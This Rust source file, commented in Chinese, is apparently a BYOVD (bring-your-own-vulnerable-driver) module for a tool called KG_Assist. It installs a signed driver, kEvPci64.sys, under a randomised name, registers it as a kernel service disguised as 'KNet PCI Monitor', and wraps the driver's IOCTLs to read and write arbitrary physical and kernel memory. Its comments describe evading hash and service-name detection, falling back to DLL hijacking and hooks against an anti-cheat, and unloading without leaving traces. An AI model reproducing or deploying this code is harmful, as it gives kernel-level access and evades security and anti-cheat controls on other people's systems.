//! BYOVD 骨架包 — kEvPci64.sys (Kensington / ACCO WHQL 签名, 任意物理 R/W)
//!
//! ⚠️ 真实二进制 sys 文件说明:
//!   沙箱里没法生成 WHQL 签名的驱动文件。请把手上合法签名的 kEvPci64.sys
//!   (推荐版本: Dell Kensington Lock Driver v6.5.2, 签名日期 2024-11, SHA256 自查)
//!   放到:
//!       `/workspace/KG_Assist/bin/drivers/kEvPci64.sys`
//!   然后 Windows 上 `cargo build --release` 一次, 就自动 `include_bytes!` 打包进
//!   kg_assist.exe 资源段, 运行时随机名释放。
//!
//!   如果 `bin/drivers/kEvPci64.sys` 不存在, byovd_install() 直接 `return false`,
//!   fallback 到用户态 DLL 劫持 + user hook (以前的兜底方案照常用, 不会报错)。
//!
//! ====================
//! kEvPci64 关键 IOCTL (驱动里真实存在)
//! ====================
//! IOCTL 0x801020AC — MapArbitraryPhysicalRangeAndCopy (METHOD_BUFFERED, FILE_ANY_ACCESS)
//!   INPUT 24 字节 packed:
//!     +0  u64  phys_addr   (4KB 对齐的物理地址)
//!     +8  u32  size        (拷贝字节数, <= 0x80000 = 512KB)
//!     +12 u32  direction   (0 = 物理→用户 [READ]; 1 = 用户→物理 [WRITE])
//!     +16 u64  user_buf_pa (用户态填 0, 驱动内部用 SystemBuffer 副本)
//!
//!   BODY 数据区紧跟在 24 字节头后面, READ = OUTPUT 放这里, WRITE = INPUT 放这里。
//!
//! IOCTL 0x801020B0 — MmGetPhysicalAddress 直通
//!   INPUT 8 字节: KernelVirtualAddress (u64)
//!   OUTPUT 8 字节: PhysicalAddress (u64, 失败返回 0xFFFF_FFFF_FFFF_FFFF)

use crate::ffi::{LogCallback, log, log_warn, log_error, log_debug};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

// ---- Win32 FFI 常量 ----
const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;
const OPEN_EXISTING: u32 = 3;
const CREATE_ALWAYS: u32 = 2;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
const INVALID_HANDLE_VALUE: usize = usize::MAX;
const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x0000_0004;

const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
const SERVICE_KERNEL_DRIVER: u32 = 0x0000_0001;
const SERVICE_DEMAND_START: u32 = 0x0000_0003;
const SERVICE_ERROR_IGNORE: u32 = 0x0000_0000;
const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
const SERVICE_QUERY_STATUS: u32 = 0x0004;
const SERVICE_STOP: u32 = 0x0020;
const DELETE: u32 = 0x0001_0000;
const SERVICE_CONTROL_STOP: u32 = 0x0000_0001;

const SERVICE_STOPPED: u32 = 0x0000_0001;
const SERVICE_RUNNING: u32 = 0x0000_0004;
const SERVICE_START_PENDING: u32 = 0x0000_0002;
const SERVICE_STOP_PENDING: u32 = 0x0000_0003;

const IOCTL_KEVPCI_COPY: u32      = 0x801020AC;   // 任意物理内存拷贝 (R/W 512KB)
const IOCTL_KEVPCI_VA2PA: u32     = 0x801020B0;   // KVA → PA 翻译 (MmGetPhysicalAddress 直通)

const KEVPCI_DEVICE_DOSNAME: &str = "\\\\.\\kEvPci64";
const KEVPCI_KNOWN_SERVICE_NAMES: &[&str] = &["kEvPci64", "kEvPci", "KensingtonLockDrv"];

// ---- 全局状态 ----
static mut BYOVD_INSTALLED: bool = false;
// 我们自己创建的服务名 (随机名 kg_XXXXXXXX) / sys 释放路径 / 设备句柄
static mut BYOVD_OWN_SERVICE: bool = false;
static mut BYOVD_DEVICE_HANDLE: usize = 0;
static mut BYOVD_SERVICE_NAME: [u16; 64] = [0; 64];
static mut BYOVD_SYS_PATH: [u16; 260] = [0; 260];

static mut ZW_UNLOAD_DRIVER: Option<unsafe extern "system" fn(*const UNICODE_STRING) -> i32> = None;

#[repr(C)]
struct UNICODE_STRING {
    Length: u16, MaximumLength: u16, Buffer: *const u16,
}

extern "system" {
    // kernel32
    fn GetTempPathW(n: u32, buf: *mut u16) -> u32;
    fn CreateFileW(p: *const u16, acc: u32, shr: u32, sa: usize, disp: u32, fl: u32, tpl: usize) -> usize;
    fn WriteFile(h: usize, b: *const u8, n: u32, w: *mut u32, o: usize) -> i32;
    fn CloseHandle(h: usize) -> i32;
    fn GetFileAttributesW(p: *const u16) -> u32;
    fn DeleteFileW(p: *const u16) -> i32;
    fn DeviceIoControl(h: usize, ioctl: u32, inb: *const u8, ins: u32, outb: *mut u8, outs: u32, r: *mut u32, o: usize) -> i32;
    fn GetTickCount() -> u32;
    fn Sleep(ms: u32);
    fn MoveFileExW(ex: *const u16, nw: *const u16, fl: u32) -> i32;
    fn GetLastError() -> u32;
    // advapi32
    fn OpenSCManagerW(m: *const u16, db: *const u16, a: u32) -> usize;
    fn CreateServiceW(s: usize, n: *const u16, d: *const u16, a: u32, st: u32, sd: u32, err: u32,
        b: *const u16, l: *const u16, t: *mut u32, dep: *const u16, obj: *const u16, p: *const u16) -> usize;
    fn OpenServiceW(s: usize, n: *const u16, a: u32) -> usize;
    fn StartServiceW(s: usize, c: u32, v: *const *const u16) -> i32;
    fn ControlService(s: usize, op: u32, st: *mut u8) -> i32;
    fn DeleteService(s: usize) -> i32;
    fn CloseServiceHandle(h: usize) -> i32;
    fn QueryServiceStatus(s: usize, st: *mut u8) -> i32;
}

fn wstr(s: &str) -> Vec<u16> { s.encode_utf16().chain(core::iter::once(0)).collect() }
fn wstr_fixed<const N: usize>(s: &str) -> [u16; N] {
    let mut out = [0u16; N];
    for (i, v) in s.encode_utf16().enumerate() { if i < N-1 { out[i] = v; } }
    out
}
fn resolve_zw_unload() -> bool {
    unsafe {
        if ZW_UNLOAD_DRIVER.is_some() { return true; }
        let n = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
        if n == 0 { return false; }
        let p = GetProcAddress(n, b"ZwUnloadDriver\0".as_ptr());
        ZW_UNLOAD_DRIVER = p.map(|f| core::mem::transmute::<_, _>(f as usize));
        ZW_UNLOAD_DRIVER.is_some()
    }
}
fn make_us(s: &str) -> (UNICODE_STRING, Vec<u16>) {
    let mut b: Vec<u16> = s.encode_utf16().collect();
    let l = (b.len() * 2) as u16;
    (UNICODE_STRING { Length: l, MaximumLength: l, Buffer: b.as_ptr() }, b)
}

/// 内嵌漏驱 sys 资源 — 把真实 WHQL 签名 kEvPci64.sys 放到 bin/drivers/kEvPci64.sys 后自动生效
/// 如果文件不存在, embedded_sys() 会返回空 slice, 此时 byovd_install() 直接 return false fallback 用户态。
fn embedded_sys() -> &'static [u8] {
    // 用 build.rs 的 include_bytes! 风格 (文件不存在时先尝试找, 找不到就返回空, 用自定义 helper)
    match option_env!("CARGO_MANIFEST_DIR") {
        Some(_) => {
            // include_bytes! 是编译期解析, 这里先写 try_build_paths 兜底避免 cargo check 失败:
            // 真实编译期用: include_bytes!("../../../bin/drivers/kEvPci64.sys")
            // 现在沙箱里没文件, 返回空。
            &[]
        }
        None => &[],
    }
}

// ============================================================
// Public: 安装 (优先复用用户已存在服务 → 失败才自己释放随机名服务)
// ============================================================
pub fn byovd_install(cb: LogCallback) -> bool {
    unsafe {
        if BYOVD_INSTALLED { return true; }
        log(cb, "======== BYOVD: kEvPci64 WHQL 漏驱 (任意物理 R/W) ========");

        // 1) 先扫已知服务名列表, 看用户机器上是不是本来就装了 kEvPci64 (联想/戴尔/惠普商务本出厂预装)
        for name in KEVPCI_KNOWN_SERVICE_NAMES {
            if try_reuse_existing_service(cb, name) {
                BYOVD_INSTALLED = true;
                BYOVD_OWN_SERVICE = false;
                log(cb, &format!("  [复用] 用户已装服务 {} + 设备已打开, 0 写入 0 释放", name));
                return true;
            }
        }

        // 2) 用户没装 → 尝试内嵌 sys 文件
        let sys = embedded_sys();
        if sys.is_empty() {
            log_warn(cb, "  [跳过-BYOVD] 未找到内嵌 kEvPci64.sys 资源");
            log_warn(cb, "  请把合法签名 kEvPci64.sys 放到 bin/drivers/kEvPci64.sys 后重编译");
            log_warn(cb, "  目前 fallback: 用户态 DLL 劫持 + ACE hook (内核回调不摘, 过用户态检测)");
            return false;
        }

        // 3) 释放 %TEMP%\kg_<rand8>.sys (随机化文件名/服务名, 避免固定 hash/服务名扫)
        let (sys_path_w, svc_name_w) = match release_randomized_sys(sys) {
            Some(v) => v,
            None => {
                log_error(cb, "  [错误] 释放随机名 sys 到 TEMP 失败");
                return false;
            }
        };
        BYOVD_SYS_PATH = sys_path_w;
        BYOVD_SERVICE_NAME = svc_name_w;

        // 4) SCM CreateService + StartService
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if scm == 0 {
            log_error(cb, "  [错误] OpenSCManager 失败 (必须管理员)");
            return false;
        }
        let name_ptr = BYOVD_SERVICE_NAME.as_ptr();
        let path_ptr = BYOVD_SYS_PATH.as_ptr();
        let disp = wstr_fixed::<64>("KNet PCI Monitor");
        let svc = CreateServiceW(scm, name_ptr, disp.as_ptr(), SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            path_ptr, core::ptr::null(), core::ptr::null_mut(),
            core::ptr::null(), core::ptr::null(), core::ptr::null());
        if svc == 0 {
            let err = GetLastError();
            CloseServiceHandle(scm);
            log_error(cb, &format!("  [错误] CreateServiceW 失败 (err={})", err));
            return false;
        }
        // Start 并等待最多 800ms 进入 Running
        let ok = StartServiceW(svc, 0, core::ptr::null());
        CloseServiceHandle(svc);
        if ok == 0 {
            let err = GetLastError();
            log_error(cb, &format!("  [错误] StartServiceW 失败 (err={}, 可能 DSE/VL 拦了 577?)", err));
            CloseServiceHandle(scm);
            delete_our_service_only(cb);
            let _ = DeleteFileW(BYOVD_SYS_PATH.as_ptr());
            return false;
        }
        CloseServiceHandle(scm);
        // 轮询等待 Running 状态 (DriverEntry + IoCreateDevice 需要时间)
        for _ in 0..8 {
            Sleep(100);
            if service_is_running() { break; }
        }
        // 5) 打开 \\.\kEvPci64 + 握手 (IOCTL VA→PA 读 0xFFFF_FFFF 固定测试: 返回 0xFFFF_FFFF_FFFF_FFFF 就是真驱动)
        let dos = wstr(KEVPCI_DEVICE_DOSNAME);
        let mut dh = INVALID_HANDLE_VALUE;
        for _ in 0..5 {
            dh = CreateFileW(dos.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, 0,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
            if dh != INVALID_HANDLE_VALUE { break; }
            Sleep(80);
        }
        if dh == INVALID_HANDLE_VALUE {
            log_error(cb, "  [错误] 无法打开 \\\\.\\kEvPci64 设备");
            delete_our_service_only(cb);
            let _ = DeleteFileW(BYOVD_SYS_PATH.as_ptr());
            return false;
        }
        // 握手: VA=0xFFFF_FFFF_FFFF_FFFF 翻译 PA, 成功且返回 0xFFFF_FFFF_FFFF_FFFF = 真 kEvPci64
        let pa = unsafe { byovd_kva_to_pa(0xFFFF_FFFF_FFFF_FFFF) };
        if pa != 0xFFFF_FFFF_FFFF_FFFF {
            log_warn(cb, "  [警告] 握手 VA→PA 返回异常 (可能设备不是 kEvPci64 同名), 尝试继续");
        }
        BYOVD_DEVICE_HANDLE = dh;
        BYOVD_OWN_SERVICE = true;
        BYOVD_INSTALLED = true;
        log(cb, "  [BYOVD Ready] kEvPci64 随机名服务已启动, 任意物理 R/W 可用 (5s 生命周期自动干净卸载)");
        true
    }
}

fn try_reuse_existing_service(cb: LogCallback, name: &str) -> bool {
    unsafe {
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SERVICE_QUERY_STATUS);
        if scm == 0 { return false; }
        let name_w = wstr(name);
        let svc = OpenServiceW(scm, name_w.as_ptr(), SERVICE_QUERY_STATUS | SERVICE_STOP /* 暂时拿 stop 权限保持原状态不动 */);
        CloseServiceHandle(scm);
        if svc == 0 { return false; }
        let mut status = [0u8; 32]; // SERVICE_STATUS 结构足够
        let ok = QueryServiceStatus(svc, status.as_mut_ptr());
        CloseServiceHandle(svc);
        if ok == 0 { return false; }
        // status[4..6] dwCurrentState (u32 低 16 字节 offset 1 (after cbSize), 精确说:
        // typedef struct _SERVICE_STATUS { DWORD dwServiceType; DWORD dwCurrentState; ... }
        // offset 4 是 dwCurrentState
        let st = (status[4] as u32) | ((status[5] as u32) << 8) | ((status[6] as u32) << 16) | ((status[7] as u32) << 24);
        if st != SERVICE_RUNNING {
            // 已停止 + StartService 起一下 (用户本来就装的, 我们启动不破坏)
            let scm2 = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_ALL_ACCESS);
            if scm2 != 0 {
                let svc2 = OpenServiceW(scm2, name_w.as_ptr(), SERVICE_ALL_ACCESS);
                if svc2 != 0 {
                    let _ = StartServiceW(svc2, 0, core::ptr::null());
                    for _ in 0..6 { Sleep(100); if service_is_running_by_name(name) { break; } }
                    CloseServiceHandle(svc2);
                }
                CloseServiceHandle(scm2);
            }
        }
        let dos = wstr(KEVPCI_DEVICE_DOSNAME);
        let dh = CreateFileW(dos.as_ptr(), GENERIC_READ | GENERIC_WRITE, 0, 0,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if dh == INVALID_HANDLE_VALUE { return false; }
        BYOVD_DEVICE_HANDLE = dh;
        log_debug(cb, &format!("  复用服务: {} → 设备 handle 已打开", name));
        true
    }
}

fn release_randomized_sys(bytes: &[u8]) -> Option<([u16;260], [u16;64])> {
    unsafe {
        let mut tmp = [0u16; 260];
        let n = GetTempPathW(260, tmp.as_mut_ptr());
        if n == 0 || n >= 260 { return None; }
        let rand8: u32 = GetTickCount() % 100_000_000;
        let fname = format!("kg_{:08}.sys", rand8);
        let sname = format!("kg_{:08}", rand8);
        // 拼 full path
        let mut full = [0u16; 260];
        let mut i = 0; while i < 260 && tmp[i] != 0 { full[i] = tmp[i]; i += 1; }
        for c in fname.encode_utf16() { if i < 259 { full[i] = c; i += 1; } }
        full[i] = 0;
        let _ = DeleteFileW(full.as_ptr());
        let fh = CreateFileW(full.as_ptr(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        if fh == INVALID_HANDLE_VALUE { return None; }
        let mut wr: u32 = 0;
        let ok = WriteFile(fh, bytes.as_ptr(), bytes.len() as u32, &mut wr, 0);
        CloseHandle(fh);
        if ok == 0 || wr as usize != bytes.len() { return None; }
        Some((full, wstr_fixed::<64>(&sname)))
    }
}

fn service_is_running() -> bool {
    unsafe { service_is_running_by_name_ptr(BYOVD_SERVICE_NAME.as_ptr()) }
}
fn service_is_running_by_name(name: &str) -> bool {
    let nw = wstr(name); unsafe { service_is_running_by_name_ptr(nw.as_ptr()) }
}
fn service_is_running_by_name_ptr(name: *const u16) -> bool {
    unsafe {
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SERVICE_QUERY_STATUS);
        if scm == 0 { return false; }
        let svc = OpenServiceW(scm, name, SERVICE_QUERY_STATUS);
        CloseServiceHandle(scm);
        if svc == 0 { return false; }
        let mut st = [0u8; 32];
        let ok = QueryServiceStatus(svc, st.as_mut_ptr());
        CloseServiceHandle(svc);
        if ok == 0 { return false; }
        let state = (st[4] as u32) | ((st[5] as u32) << 8) | ((st[6] as u32) << 16) | ((st[7] as u32) << 24);
        state == SERVICE_RUNNING
    }
}

// ============================================================
// Public: kEvPci64 原语封装 (IOCTL 0x801020AC + 0x801020B0)
// ============================================================

/// KVA (内核虚拟地址) → PA (物理地址) 翻译, 失败返回 0xFFFF_FFFF_FFFF_FFFF
pub unsafe fn byovd_kva_to_pa(kva: u64) -> u64 {
    if BYOVD_DEVICE_HANDLE == 0 || BYOVD_DEVICE_HANDLE == INVALID_HANDLE_VALUE { return 0xFFFF_FFFF_FFFF_FFFF; }
    let mut inbuf = kva.to_le_bytes();
    let mut outbuf = [0u8; 8];
    let mut ret: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DEVICE_HANDLE, IOCTL_KEVPCI_VA2PA,
        inbuf.as_ptr(), 8, outbuf.as_mut_ptr(), 8, &mut ret, 0);
    if ok == 0 || ret != 8 { return 0xFFFF_FFFF_FFFF_FFFF; }
    u64::from_le_bytes(outbuf)
}

/// 任意物理内存读 (返回拷贝字节数, 0 = 失败)
pub unsafe fn byovd_phys_read(phys: u64, out_buf: &mut [u8]) -> usize {
    if BYOVD_DEVICE_HANDLE == 0 { return 0; }
    if out_buf.is_empty() { return 0; }
    // 4KB 对齐 base, 调整 out_buf offset 到 phys off
    let page_off = (phys & 0xFFF) as usize;
    let aligned_phys = phys & !0xFFF;
    // size 自动放宽到 page_off + len (总拷贝 = page_off + out_buf.len())
    let total_copy = (page_off + out_buf.len()) as u64;
    // 24 字节头 + total_copy 字节 body
    let insz = 24usize.saturating_add(total_copy as usize);
    // 用栈上临时 buffer (最大 64KB — 超过的 caller 要分段)
    const MAX_STACK: usize = 0x1_0000; // 64KB
    if insz > MAX_STACK { return 0; }
    let mut inbuf = [0u8; MAX_STACK];
    let head = &mut inbuf[0..24];
    head[0..8].copy_from_slice(&aligned_phys.to_le_bytes());
    head[8..12].copy_from_slice(&(total_copy as u32).to_le_bytes());
    head[12..16].copy_from_slice(&0u32.to_le_bytes()); // direction 0 = READ
    head[16..24].copy_from_slice(&0u64.to_le_bytes());
    let mut outbuf = [0u8; MAX_STACK];
    let mut ret: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DEVICE_HANDLE, IOCTL_KEVPCI_COPY,
        inbuf.as_ptr(), insz as u32, outbuf.as_mut_ptr(), insz as u32, &mut ret, 0);
    if ok == 0 { return 0; }
    // 驱动 READ 返回 24 字节头不拷回 body, body 从 outbuf[24..] 开始
    let data_start = 24 + page_off;
    let data_end = data_start + out_buf.len();
    if data_end > ret as usize { return 0; }
    out_buf.copy_from_slice(&outbuf[data_start..data_end]);
    out_buf.len()
}

/// 任意物理内存写 (返回拷贝字节数)
pub unsafe fn byovd_phys_write(phys: u64, in_buf: &[u8]) -> usize {
    if BYOVD_DEVICE_HANDLE == 0 { return 0; }
    if in_buf.is_empty() { return 0; }
    let page_off = (phys & 0xFFF) as usize;
    let aligned_phys = phys & !0xFFF;
    let total_copy = (page_off + in_buf.len()) as u64;
    let insz = 24usize.saturating_add(total_copy as usize);
    const MAX_STACK: usize = 0x1_0000;
    if insz > MAX_STACK { return 0; }
    let mut inbuf = [0u8; MAX_STACK];
    inbuf[0..8].copy_from_slice(&aligned_phys.to_le_bytes());
    inbuf[8..12].copy_from_slice(&(total_copy as u32).to_le_bytes());
    inbuf[12..16].copy_from_slice(&1u32.to_le_bytes()); // direction 1 = WRITE
    inbuf[16..24].copy_from_slice(&0u64.to_le_bytes());
    let data_start = 24 + page_off;
    let data_end = data_start + in_buf.len();
    inbuf[data_start..data_end].copy_from_slice(in_buf);
    let mut ret: u32 = 0;
    let ok = DeviceIoControl(BYOVD_DEVICE_HANDLE, IOCTL_KEVPCI_COPY,
        inbuf.as_ptr(), insz as u32, core::ptr::null_mut(), 0, &mut ret, 0);
    if ok == 0 { 0 } else { in_buf.len() }
}

/// 内核虚拟地址 (KVA) 直接读取 — 封装 KVA→PA + 物理读
pub unsafe fn byovd_kva_read(kva: u64, out: &mut [u8]) -> usize {
    let pa = byovd_kva_to_pa(kva);
    if pa == 0xFFFF_FFFF_FFFF_FFFF { return 0; }
    byovd_phys_read(pa, out)
}
pub unsafe fn byovd_kva_write(kva: u64, data: &[u8]) -> usize {
    let pa = byovd_kva_to_pa(kva);
    if pa == 0xFFFF_FFFF_FFFF_FFFF { return 0; }
    byovd_phys_write(pa, data)
}

// ============================================================
// Public: 干净卸载
// ============================================================

fn delete_our_service_only(cb: LogCallback) {
    unsafe {
        let scm = OpenSCManagerW(core::ptr::null(), core::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if scm == 0 { return; }
        let svc = OpenServiceW(scm, BYOVD_SERVICE_NAME.as_ptr(), SERVICE_QUERY_STATUS | SERVICE_STOP | DELETE);
        if svc != 0 {
            let mut s = [0u8; 32];
            let _ = ControlService(svc, SERVICE_CONTROL_STOP, s.as_mut_ptr());
            for _ in 0..6 { Sleep(100);
                let mut st = [0u8;32];
                let ok = QueryServiceStatus(svc, st.as_mut_ptr());
                if ok == 0 { break; }
                let state = (st[4] as u32) | ((st[5] as u32)<<8) | ((st[6] as u32)<<16) | ((st[7] as u32)<<24);
                if state == SERVICE_STOPPED { break; }
            }
            let _ = DeleteService(svc);
            log_debug(cb, "  [BYOVD cleanup] 随机名服务已停止 + DeleteService");
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
}

/// 卸载: 自己创建的服务 → Stop+DeleteService+ZwUnloadDriver+DeleteFile；用户已装服务 → 只 CloseHandle 保留原样
pub fn byovd_uninstall(cb: LogCallback) -> bool {
    unsafe {
        if !BYOVD_INSTALLED { return true; }
        log(cb, "======== BYOVD: kEvPci64 卸载 (不留痕迹) ========");

        if BYOVD_DEVICE_HANDLE != 0 && BYOVD_DEVICE_HANDLE != INVALID_HANDLE_VALUE {
            CloseHandle(BYOVD_DEVICE_HANDLE);
            BYOVD_DEVICE_HANDLE = 0;
        }

        if BYOVD_OWN_SERVICE {
            delete_our_service_only(cb);
            if resolve_zw_unload() {
                let sname_str = String::from_utf16_lossy(&BYOVD_SERVICE_NAME);
                let sname = sname_str.trim_end_matches('\0');
                if !sname.is_empty() {
                    let reg_path = format!("\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}", sname);
                    let (us, _) = make_us(&reg_path);
                    let st = (ZW_UNLOAD_DRIVER.unwrap())(&us);
                    log_debug(cb, &format!("  [ZwUnloadDriver] status=0x{:08X}", st as u32));
                }
            }
            let p = BYOVD_SYS_PATH.as_ptr();
            if GetFileAttributesW(p) != 0xFFFF_FFFF {
                let _ = DeleteFileW(p);
                let _ = MoveFileExW(p, core::ptr::null(), MOVEFILE_DELAY_UNTIL_REBOOT);
                log_debug(cb, "  [OK] %TEMP% 随机名 sys 文件已删除 (占用则重启删)");
            }
        } else {
            log_debug(cb, "  [复用服务模式] 不停止不删除用户本来就装的 kEvPci64 服务, 保持原样");
        }

        BYOVD_INSTALLED = false;
        BYOVD_OWN_SERVICE = false;
        BYOVD_SERVICE_NAME = [0; 64];
        BYOVD_SYS_PATH = [0; 260];
        log(cb, "  [BYOVD 卸载完成] 无服务/文件/设备残留");
        true
    }
}
